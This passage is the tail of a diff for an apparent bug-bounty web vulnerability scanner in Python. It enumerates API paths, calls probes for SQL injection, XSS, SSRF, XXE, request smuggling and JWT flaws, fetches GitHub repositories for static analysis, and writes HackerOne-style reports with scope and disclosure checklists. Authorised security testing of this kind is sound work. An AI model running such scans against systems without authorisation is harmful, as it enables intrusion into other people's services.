+                    "evidence": f"Baseline avg: {base_avg:.2f}s\n"
+                                f"Payload attempt 1: {delta:.2f}s\n"
+                                f"Payload attempt 2: {delta2:.2f}s\n"
+                                f"(Both > baseline + 5s, indicating server-side sleep executed.)",
+                    "remediation": "Parameterize queries; avoid shell interpolation; sanitize input.",
+                    "repro_ps":   f"Measure-Command {{ {repro['powershell']} }}",
+                    "repro_curl": f"time {repro['curl']}",
+                    "needs_manual_verification": False,
+                })
+                return findings
+    return findings
+
+# =============================================================================
+# Scan orchestration
+# =============================================================================
+def scan_target(base_domains: List[str], args) -> List[dict]:
+    all_findings: List[dict] = []
+    prefixes = ["", "api", "v1", "v2", "v3", "v4", "rest", "graphql"]
+    nouns = [
+        "users", "accounts", "orders", "positions", "portfolios", "instruments",
+        "quotes", "watchlists", "markets", "fundamentals", "dividends", "documents",
+        "ach", "options", "crypto", "transfers", "relationships", "trading",
+        "profile", "settings", "config", "admin", "metrics", "health", "status",
+        "version", "login", "logout", "signup", "register", "reset", "change",
+        "forgot", "me", "search", "files", "messages", "notifications",
+    ]
+    api_paths = []
+    for p in prefixes:
+        for n in nouns:
+            api_paths.append(f"/{p}/{n}" if p else f"/{n}")
+    api_paths += [
+        "/swagger.json", "/swagger.yaml", "/openapi.json", "/openapi.yaml",
+        "/api-docs", "/graphql", "/query", "/.well-known/jwks.json",
+        "/actuator/health", "/actuator/info", "/reset-password",
+        "/change-password", "/forgot-password", "/sitemap.xml", "/robots.txt",
+    ]
+
+    for base in base_domains:
+        if not base.startswith("http"):
+            base = "https://" + base
+
+        print(f"[*] === Scanning {base} ===")
+        print(f"[*] Warming up {base}...")
+        warm = http_request(base, method="HEAD")
+        waf = detect_waf(warm)
+        if waf:
+            print(f"[!] WAF detected on {base}: {waf} — adjusting pacing")
+
+        # Manual authentication only – no auto-auth
+        if args.username and args.password:
+            # Manual login would go here (not implemented)
+            pass
+
+        # Per-host probes
+        print(f"[*] Global probes for {base}")
+        all_findings.extend(cors_misconfiguration(base))
+        all_findings.extend(subdomain_takeover(base))
+        all_findings.extend(host_header_injection(base))
+        all_findings.extend(http_smuggling_test(base))
+        all_findings.extend(exposed_config_check(base))
+
+        # Path-by-path
+        for path in api_paths:
+            url = base.rstrip("/") + path
+            time.sleep(REQUEST_DELAY)
+            resp = http_request(url)
+            print(f"[DEBUG] {url} -> {resp['status']} ({len(resp.get('body',''))} bytes)")
+
+            if resp["status"] not in (200, 401, 403):
+                continue
+
+            content_type = (resp.get("headers", {}).get("Content-Type", "")
+                            or resp.get("headers", {}).get("content-type", "")).lower()
+            is_html = ("text/html" in content_type
+                       or ("text/plain" in content_type and "<html" in resp["body"][:1000].lower()))
+
+            # Flag unauth API exposure only for real API responses
+            if (resp["status"] == 200 and not is_html
+                    and not any(w in resp["body"].lower()
+                                for w in ("unauthorized", "please log in", "login required"))):
+                repro = dual_repro("GET", url)
+                all_findings.append({
+                    "type": "api_no_auth",
+                    "title": "API Endpoint Accessible Without Authentication",
+                    "severity": "HIGH", "cwe": "CWE-862", "owasp": "A01:2021", "url": url,
+                    "evidence": f"GET {url} -> {resp['status']}\n"
+                                f"Content-Type: {content_type}\n\n{resp['body'][:1500]}",
+                    "remediation": "Require authentication / authorization for this endpoint.",
+                    "repro_ps": repro["powershell"], "repro_curl": repro["curl"],
+                    "needs_manual_verification": True,
+                })
+
+            # Method enumeration on 200/401/403 (verb tampering)
+            all_findings.extend(method_enumeration(url))
+
+            # Only run vuln tests on 200 (don't waste on auth walls)
+            if resp["status"] != 200:
+                continue
+
+            # Parameter-driven tests
+            parsed = urllib.parse.urlparse(url)
+            qs = urllib.parse.parse_qs(parsed.query)
+            for param in qs.keys():
+                value = qs[param][0]
+                all_findings.extend(test_sql_injection(url, param, value))
+                if value.isdigit():
+                    all_findings.extend(test_idor(url, param, value))
+                all_findings.extend(test_xss(url, param))
+                all_findings.extend(test_path_traversal(url, param))
+                all_findings.extend(timing_based_tests(url, param))
+                if any(k in param.lower() for k in ("url","uri","link","src","dest","redirect","callback")):
+                    all_findings.extend(test_ssrf(url, param))
+
+            # GraphQL introspection
+            all_findings.extend(test_graphql_introspection(url))
+
+            # Advanced zero-day modules
+            all_findings.extend(advanced_deserialization_checks(url))
+            all_findings.extend(advanced_graphql_batch_checks(url))
+            all_findings.extend(advanced_prototype_pollution(url))
+            all_findings.extend(race_condition_test(url, "POST"))
+            all_findings.extend(cache_poisoning_test(url))
+            all_findings.extend(xxe_injection(url))
+            all_findings.extend(ldap_injection_advanced(url))
+            all_findings.extend(crlf_injection(url))
+            all_findings.extend(open_redirect(url))
+            all_findings.extend(business_logic_bypass(url))
+            all_findings.extend(parameter_pollution(url))
+            all_findings.extend(email_header_injection(url))
+
+            # JWT checks if response contains a JWT
+            if re.search(r'eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
+                         resp.get("body", "")):
+                all_findings.extend(advanced_jwt_checks(url, resp["body"]))
+
+    return all_findings
+
+# =============================================================================
+# GitHub repo download (with token auth)
+# =============================================================================
+def fetch_github_repo(org_repo: str, out_dir: str) -> Optional[str]:
+    print(f"[*] Downloading {org_repo} from GitHub...")
+    api_url = f"https://api.github.com/repos/{org_repo}/zipball"
+    headers = {}  # will add required header and possibly token
+    gh_token = os.environ.get("GITHUB_TOKEN")
+    if gh_token:
+        headers["Authorization"] = f"token {gh_token}"
+        print("[*] Using GITHUB_TOKEN for auth (5000/hr rate limit)")
+    else:
+        print("[!] No GITHUB_TOKEN set — unauth rate limit is 60/hr. "
+              "Set $env:GITHUB_TOKEN (PowerShell) or export GITHUB_TOKEN (bash) to raise it.")
+    req = urllib.request.Request(api_url, headers=headers)
+    # Add the researcher header as well
+    req.add_header("X-HackerOne-Research", RESEARCHER)
+    ctx = _build_ctx(False)
+    try:
+        with urllib.request.urlopen(req, timeout=60, context=ctx) as resp:
+            data = resp.read()
+        zip_path = os.path.join(out_dir, "repo.zip")
+        with open(zip_path, "wb") as f:
+            f.write(data)
+        extract_dir = os.path.join(out_dir, "repo")
+        os.makedirs(extract_dir, exist_ok=True)
+        with zipfile.ZipFile(zip_path, 'r') as zf:
+            zf.extractall(extract_dir)
+        subdirs = [d for d in os.listdir(extract_dir)
+                   if os.path.isdir(os.path.join(extract_dir, d))]
+        return os.path.join(extract_dir, subdirs[0]) if subdirs else extract_dir
+    except Exception as e:
+        print(f"    Error: {e}")
+        return None
+
+# =============================================================================
+# Report generation — verification-gated, dual-platform repro
+# =============================================================================
+def _sev_rank(sev: str) -> int:
+    return {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}.get(sev, 4)
+
+def generate_report(findings: List[dict], target: str, out_dir: str):
+    reports_dir = os.path.join(out_dir, "reports")
+    os.makedirs(reports_dir, exist_ok=True)
+
+    findings_sorted = sorted(findings, key=lambda f: _sev_rank(f.get("severity", "LOW")))
+
+    for i, f in enumerate(findings_sorted, 1):
+        safe = re.sub(r'[^a-zA-Z0-9]', '_', f.get('title', 'finding'))[:60]
+        fname = f"{i:03d}_{safe}.md"
+        needs_manual = f.get("needs_manual_verification", True)
+
+        with open(os.path.join(reports_dir, fname), "w", encoding="utf-8") as out:
+            out.write(f"# {f.get('title')}\n\n")
+            out.write(f"**Researcher:** {RESEARCHER} (HackerOne)  \n")
+            out.write(f"**Contact:** isiahjones@mail.com  \n")
+            out.write(f"**Run marker (in every request header):** `{RUN_MARKER}`  \n")
+            out.write(f"**Severity:** {f.get('severity')}  \n")
+            out.write(f"**CWE:** {f.get('cwe')}  /  **OWASP:** {f.get('owasp')}  \n")
+            out.write(f"**Target:** `{target}`  \n")
+            out.write(f"**Asset:** `{f.get('url', f.get('file','N/A'))}`  \n")
+            out.write(f"**Detected (UTC):** {dt.datetime.utcnow().isoformat()}Z  \n\n")
+
+            if needs_manual:
+                out.write("> ⚠️ **VERIFICATION REQUIRED** — automated detection only.\n"
+                          "> Do NOT submit this report to the program until ALL checkboxes below\n"
+                          "> are completed AND this banner is removed.\n\n")
+
+            out.write("## Summary\n")
+            out.write(f.get('description',
+                      f"Automated detection flagged **{f.get('title')}** on the asset above. "
+                      "See Evidence and complete manual verification below before submitting.\n") + "\n\n")
+
+            out.write("## Reproduction — PowerShell (Windows)\n")
+            out.write("```powershell\n")
+            out.write(f.get("repro_ps", "# reproduction missing") + "\n")
+            out.write("```\n\n")
+
+            out.write("## Reproduction — curl (Linux / macOS / WSL)\n")
+            out.write("```bash\n")
+            out.write(f.get("repro_curl", "# reproduction missing") + "\n")
+            out.write("```\n\n")
+
+            out.write("## Raw Evidence Captured\n")
+            out.write("```\n")
+            ev = f.get('evidence', 'MISSING')
+            out.write((ev[:3500] + "\n...(truncated)" if len(ev) > 3500 else ev) + "\n")
+            out.write("```\n\n")
+
+            out.write("## Impact — FILL BEFORE SUBMIT\n")
+            out.write("- [ ] What can attacker do now that they couldn't before (concrete actions)?\n")
+            out.write("- [ ] Data classes affected (PII / financial / credentials / source / other)?\n")
+            out.write("- [ ] User count impact (bounded estimate with reasoning)?\n")
+            out.write("- [ ] Pre-conditions (auth required? specific role? browser? timing?)?\n")
+            out.write("- [ ] Chainability — does this unlock a higher-severity attack?\n\n")
+
+            out.write("## Remediation\n")
+            out.write(f.get('remediation', 'Follow OWASP guidance for this CWE.') + "\n\n")
+
+            out.write("## Dupe & Scope Check — FILL BEFORE SUBMIT\n")
+            out.write("- [ ] Searched program hacktivity for this class on this target\n")
+            out.write("- [ ] Verified asset is IN-SCOPE per current program page\n")
+            out.write("- [ ] Verified this class is not explicitly OUT-OF-SCOPE for the program\n")
+            out.write("- [ ] Not on program's published 'known issues / do not report' list\n")
+            out.write("- [ ] Not self-exploitation / not theoretical-only\n\n")
+
+            out.write("## Disclosure & Legal\n")
+            out.write("- [ ] All testing stayed within program scope and rate limits\n")
+            out.write("- [ ] No third-party user data was retained beyond PoC demonstration\n")
+            out.write("- [ ] PoC data has been deleted from my systems\n")
+            out.write("- [ ] I will not publicly disclose until the program authorizes disclosure\n\n")
+
+            out.write("---\n")
+            out.write(f"*Generated by deephunterv3.1 at {dt.datetime.utcnow().isoformat()}Z*\n")
+
+    # SUMMARY.md
+    counts = {sev: len([x for x in findings_sorted if x.get('severity') == sev])
+              for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW")}
+    manual_count = len([x for x in findings_sorted if x.get("needs_manual_verification")])
+
+    with open(os.path.join(out_dir, "SUMMARY.md"), "w", encoding="utf-8") as f:
+        f.write(f"# deephunterv3.1 — Scan Summary\n\n")
+        f.write(f"**Target:** {target}  \n")
+        f.write(f"**Run marker:** `{RUN_MARKER}`  \n")
+        f.write(f"**Scanned (UTC):** {dt.datetime.utcnow().isoformat()}Z  \n")
+        f.write(f"**Total findings (pre-verification):** {len(findings_sorted)}  \n")
+        f.write(f"**Require manual verification:** {manual_count}  \n\n")
+        f.write("## Findings by Severity\n\n")
+        f.write("| Severity | Count |\n|---|---|\n")
+        for sev in ("CRITICAL", "HIGH", "MEDIUM", "LOW"):
+            f.write(f"| {sev} | {counts[sev]} |\n")
+        f.write("\n## Findings Index\n\n")
+        for i, fd in enumerate(findings_sorted, 1):
+            safe = re.sub(r'[^a-zA-Z0-9]', '_', fd.get('title', 'finding'))[:60]
+            marker = " ⚠️" if fd.get("needs_manual_verification") else ""
+            f.write(f"{i}. **[{fd.get('severity')}]** {fd.get('title')}{marker}  \n")
+            f.write(f"   Asset: `{fd.get('url', fd.get('file','N/A'))}`  \n")
+            f.write(f"   Report: `reports/{i:03d}_{safe}.md`\n\n")
+        f.write("\n---\n\n")
+        f.write("⚠️ = requires manual verification before submitting to bounty program.\n")
+
+# =============================================================================
+# Main
+# =============================================================================
+def main():
+    parser = argparse.ArgumentParser(
+        description="deephunterv3.1 — cross-platform bug bounty scanner (pure Python stdlib)")
+    parser.add_argument("-d", "--domain", required=True,
+                        help="Target domain (example.com) or github org/repo (org/repo)")
+    parser.add_argument("--web-domains", help="Comma-separated domains to scan (wildcard like *.example.com)")
+    parser.add_argument("-u", "--username", help="Manual username (not implemented – placeholder)")
+    parser.add_argument("-p", "--password", help="Manual password (not implemented – placeholder)")
+    parser.add_argument("--login-url", help="Custom login URL (not used)")
+    parser.add_argument("--code-only", action="store_true", help="Only static code analysis (GitHub repo)")
+    parser.add_argument("--insecure", action="store_true",
+                        help="Disable TLS cert verification (default: verify)")
+    parser.add_argument("--no-crtsh", action="store_true", help="Skip crt.sh CT-log subdomain harvest")
+    parser.add_argument("-o", "--output", help="Output directory")
+    # Dynamic headers
+    parser.add_argument("--user-agent", help="Set User-Agent header (overrides default)")
+    parser.add_argument("--header", action="append", help="Custom header 'Name: Value' (can repeat)")
+    args = parser.parse_args()
+
+    # Set extra headers from command line
+    extra_headers = {}
+    if args.user_agent:
+        extra_headers["User-Agent"] = args.user_agent
+    if args.header:
+        for h in args.header:
+            if ":" in h:
+                name, val = h.split(":", 1)
+                extra_headers[name.strip()] = val.strip()
+            else:
+                print(f"[!] Ignoring invalid header format: {h}")
+    set_extra_headers(extra_headers)
+
+    safe_domain = args.domain.replace(':', '_').replace('/', '_')
+    out_dir = args.output or f"DeepHunter_{safe_domain}_{dt.datetime.now().strftime('%Y%m%d_%H%M%S')}"
+    os.makedirs(out_dir, exist_ok=True)
+
+    print("=" * 70)
+    print(" deephunterv3.1 — cross-platform bug bounty scanner")
+    print(f" Target:  {args.domain}")
+    print(f" Output:  {out_dir}")
+    print(f" Marker:  {RUN_MARKER}")
+    print(f" Python:  {sys.version.split()[0]} on {sys.platform}")
+    if args.insecure:
+        print(" [!] --insecure: TLS cert verification disabled")
+    if extra_headers:
+        print(f" Extra headers: {extra_headers}")
+    print("=" * 70)
+
+    all_findings = []
+
+    # Static / repo scan mode
+    if args.code_only or ("github.com" in args.domain and not args.web_domains):
+        path = urllib.parse.urlparse(args.domain).path
+        if path.startswith("/"):
+            path = path[1:]
+        org_repo = path.rstrip("/") or args.domain.split("/")[-1]
+        print(f"[*] Static analysis on GitHub repo: {org_repo}")
+        repo_path = fetch_github_repo(org_repo, out_dir)
+        if repo_path:
+            for root, _, files in os.walk(repo_path):
+                for fname in files:
+                    if fname.endswith(('.py', '.js', '.go', '.rs', '.java', '.sol', '.ts', '.jsx',
+                                        '.json', '.yaml', '.yml', '.env', '.txt', '.md', '.tf',
+                                        '.tfvars', '.sh', '.ps1', '.rb', '.php', '.xml', '.conf')):
+                        full = os.path.join(root, fname)
+                        all_findings.extend(scan_code(full))
+            static_ct = len([f for f in all_findings if f.get('type', '').startswith('static')])
+            print(f"    Found {static_ct} static issues")
+        else:
+            print("    Failed to fetch repository")
+
+    # Dynamic scan mode
+    web_domains = []
+    if args.web_domains:
+        for d in args.web_domains.split(","):
+            d = d.strip()
+            if d.startswith("*."):
+                base = d[2:]
+                subs = set(brute_subdomains(base))
+                if not args.no_crtsh:
+                    subs.update(crtsh_subdomains(base))
+                web_domains.extend(sorted(subs))
+            else:
+                web_domains.append(d)
+    elif not args.code_only:
+        web_domains = [args.domain]
+    web_domains = list(dict.fromkeys(web_domains))  # dedupe, preserve order
+
+    if not args.code_only and web_domains:
+        print(f"\n[*] Scanning {len(web_domains)} hosts...")
+        findings = scan_target(web_domains, args)
+        all_findings.extend(findings)
+        print(f"\n[+] Total findings (pre-verification): {len(findings)}")
+
+    # Save
+    with open(os.path.join(out_dir, "ALL_FINDINGS.json"), "w", encoding="utf-8") as f:
+        json.dump(all_findings, f, indent=2, default=str)
+    generate_report(all_findings, args.domain, out_dir)
+
+    print(f"\n[+] Reports:  {os.path.join(out_dir, 'reports')}")
+    print(f"[+] Summary:  {os.path.join(out_dir, 'SUMMARY.md')}")
+    print(f"[+] JSON:     {os.path.join(out_dir, 'ALL_FINDINGS.json')}")
+    print("=" * 70)
+    manual_count = len([x for x in all_findings if x.get("needs_manual_verification")])
+    if manual_count:
+        print(f"[!] {manual_count} findings require MANUAL VERIFICATION before submission.")
+        print(f"    See the ⚠️ banner at the top of each flagged report.")
+    print("=" * 70)
+
+if __name__ == "__main__":
+    main()
